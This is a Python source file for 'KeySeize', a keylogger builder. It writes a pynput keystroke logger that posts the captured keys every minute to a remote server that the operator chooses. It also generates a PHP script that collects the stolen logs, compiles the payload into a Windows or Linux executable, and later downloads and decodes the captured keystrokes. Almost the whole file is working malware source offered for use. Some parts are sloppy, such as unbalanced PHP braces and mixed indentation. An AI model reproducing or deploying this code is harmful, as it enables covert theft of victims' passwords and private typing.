import requests
import os
import time
import sys
import shutil
import subprocess

try:
	mode = sys.argv[1]
	server = sys.argv[2]
except:
	print("Coded and Developed by: Nishant Parhi")
	print("Github: nishantparhi")
	print("Instagram: Xploitit")
	print("Usage: KeySeize <mode> <server> [if applicable]\nExample: KeyHack c http://server.com\nmodes:\nc -> Create Payloads\ns -> Stream Keylog\nNotes: If using Option 'c' to create a payload, you may supply a OS type to complile for (windows, linux)\nExample: ./keyseize.py c 'http://yourhost.com' windows")
	try:
		exit(0)
	except:
		sys.exit(1)
if(mode == 'c'):
	try:
		os_type = sys.argv[3]
	except:
		os_type = 'not_specified'
keylogger_code = ('''
import logging
import os
import requests
import re
import pynput
from pynput.keyboard import Key, Listener
import requests
import socket
import time
import threading
import random
key_info_file = ''
encoded_data = ''
def key_handler_main():
	global key_info_file
	key_info_file = str(random.getrandbits(10))+'.log'
	logging.basicConfig(filename=('/home/'+key_info_file),level=logging.DEBUG)
	def key_data(key):
		logging.info(key)
	with Listener(on_press=key_data) as key_init:
		key_init.join()
def server_communication(key_data):
	global server
	try:
		r = requests.post(server+'/keyseize.php',data={'key_data' : key_data})
		if(r.status_code == 200):
			print('[*] Successfully Sent Latest Load => '+str(server))
		else:
			print("[-] Error Sending Load => "+str(server))
	except Exception as e:
		print(e)
def encode_keys():
	global key_info_file
	global encoded_data
	with open('/home/'+key_info_file, 'r') as key_handler:
		encoded_data = ''
		encoded_data += str(str(key_handler.read()).strip())
		print("[*] Successfully Encoded Key Data.")
		key_handler.close()
t0 = threading.Thread(target=key_handler_main)
t0.start()
while True:
	time.sleep(60)
	encode_keys()
	server_communication(encoded_data)
''')
server_code = ("""
	$encoded_key_data = $_POST['key_data'];
	if(file_exists("keyseize.log")){
		$file = fopen("keyseize.log","a");
	} else {
		$file = fopen("keyseize.log", "w");
	fwrite($file,$encoded_key_data."\n");
	fclose($file);
?>
""")
def generate_payloads(server,outfile):
	global keylogger_code
	global server_code
	print("[*] Writing Payload...")
	try:
		f = open(outfile, 'w+')
		f.write('#!/usr/bin/env python' + '\n'+'server = "'+server+'"'+'\n'+str(keylogger_code))
		f.close()
		f = open('keyseize.php','w+')
		f.write('<?php'+'\n'+str(server_code))
		f.close()
		print("[*] Generated Payload Files => "+str(outfile)+", keyseize.php")
		if(os_type.lower() == 'windows'):
			print("[*] Compiling for windows...")
			subprocess.call("wine C:\\\Python27\\\Scripts\\\pyinstaller.exe -w -F "+str(outfile)+' 2> /dev/null', shell=True)
			time.sleep(15)
			os.remove(outfile)
			shutil.copyfile('dist/'+outfile+'.exe', outfile+'.exe')
			print("Compliling done => {}").format(outfile+'.exe')
			shutil.rmtree('dist')
			shutil.rmtree('build')
			os.remove(outfile+'.spec')
		elif(os_type.lower() == 'linux'):
			print("[*] Compiling for Linux...")
                        subprocess.call("pyinstaller -w -F "+str(outfile)+' 2> /dev/null', shell=True)
			time.sleep(15)
			os.remove(outfile)
                        shutil.copyfile('dist/'+outfile, outfile)
                        print("Compliling done => {}").format(outfile)
                        shutil.rmtree('dist')
                        shutil.rmtree('build')
                        os.remove(outfile+'.spec')
	except:
		raise
#		print("[-] Error. Unable to create payload files...")

def key_stream(server):
	print("[*] Connecting to server {}").format(server)
	r = requests.get(server+'/keyseize.log')
	print("[*] Writing Key Stream => out_data.log")
	try:
		f = open('out_data.log', 'w+')
		f.write(str(r.content))
		f.close()
	except:
		print("[-] Could not write key stream...")
		try:
			exit(0)
		except:
			sys.exit(1)
	f = open('out_data.log', 'r')
	key_data_final = ''
	for line in f:
		if(":u'" in line.strip()):
			key_data_final += str(line.strip().split(":u'")[1]).split("'")[0]
		if('Key.' in line.strip()):
			action_val = line.strip().split('Key.')[1]
			if(action_val == 'enter'):
				key_data_final += '\n'
			elif(action_val == 'backspace'):
				key_data_final += ' [BACKSPACE] '
			elif(action_val == 'space'):
				key_data_final += ' '
			elif(action_val == 'up'):
				key_data_final + ' [UP ARROW] '
			elif(action_val == 'down'):
				key_data_final + ' [DOWN ARROW] '
	print(key_data_final)
	os.remove('out_data.log')
if(mode == 'c'):
	generate_payloads(server,'keyseize_malware')
elif(mode == 's'):
	key_stream(server)
